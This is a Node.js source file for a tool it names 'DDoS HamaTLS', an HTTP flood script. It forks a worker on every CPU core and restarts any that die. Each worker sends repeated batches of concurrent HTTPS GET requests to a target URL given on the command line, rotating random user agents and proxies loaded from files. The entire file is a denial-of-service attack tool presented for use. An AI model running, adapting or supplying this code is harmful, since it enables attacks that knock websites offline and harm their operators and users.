const cluster = require('cluster');
const fs = require('fs');
const url = require('url');
const tls = require('tls');
const sslRootCAs = require('ssl-root-cas');
const axios = require('axios');
const https = require('https');
const numCPUs = require('os').cpus().length;

const userAgents = fs.readFileSync('user-agents.txt', 'utf-8').split('\n').filter(Boolean);

const targetURL = process.argv[2];
const part = url.parse(targetURL, true);
// const originalConsoleLog = console.log;
// console.log = function() {};

let tlsOptions = {
  key: fs.readFileSync('client-key.pem', 'utf-8'),
  cert: fs.readFileSync('client-cert.pem', 'utf-8'),
  ca: [] 
};

if (tlsOptions.ca.length === 0) {
  const injectedCAs = sslRootCAs.inject();
  tlsOptions.ca = injectedCAs;
}

if (cluster.isMaster) {
  console.log(`DDoS HamaTLS 1.0.1 | Developed by R: | Target : ${part.href}`);
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
  cluster.on('exit', (worker, code, signal) => {
    // console.log(`Worker ${worker.process.pid} died`);
    cluster.fork();
  });
} else {
  let requestCount = 0;
  const maxRequests = 500;
  const intervalTime = maxRequests/maxRequests*1000;
  const maxRuntime = process.argv[3] * 1000;

  const agent = new https.Agent({ tls: tlsOptions, keepAlive: true, maxSockets: Infinity, });
  
  async function makeRequest() {
    try {
      const proxy = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
      const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
      const randomProxyIndex = Math.floor(Math.random() * proxy.length);
      const [ip,port] = proxy[randomProxyIndex].split(':').map(part => part.trim());

      const requests = await Promise.all([
        axios({ method: 'GET', host: ip, port: port, url: part.href, headers: { useragent: randomUserAgent, host: part.host, 'Proxy-Connection': 'Keep-Alive', connection: 'Keep-Alive'}, httpsAgent: agent, path: part.host + ':443', timeout: 15000}),
        axios({ method: 'GET', host: ip, port: port, url: part.href, headers: { useragent: randomUserAgent, host: part.host, 'Proxy-Connection': 'Keep-Alive', connection: 'Keep-Alive'}, httpsAgent: agent, path: part.host + ':443', timeout: 15000}),
        axios({ method: 'GET', host: ip, port: port, url: part.href, headers: { useragent: randomUserAgent, host: part.host, 'Proxy-Connection': 'Keep-Alive', connection: 'Keep-Alive'}, httpsAgent: agent, path: part.host + ':443', timeout: 15000}),
      ]);
      requests.forEach((response, index) => {
        console.log(`Ip: ${ip}:${port} StatusCode : ${response.status}`);
      }) 
      
      requestCount++;

      if (requestCount < maxRequests && process.uptime() * 1000 < maxRuntime) {
        setTimeout(makeRequest, intervalTime);
      } else {
        process.disconnect();
        // console.log(`Worker ${cluster.worker.process.pid} finished`);
      }
      
    } catch (error) {
      // if (axios.isCancel(error))
      console.error(`Worker ${process.pid} - Error:`, error.message);
      process.disconnect();
    }
  }
 
  async function run() {
    await makeRequest();
    const requests = Array.from({ length: maxRequests - 1 }, makeRequest);
    await Promise.all(requests);
    process.disconnect();
  }
 
  run();
}
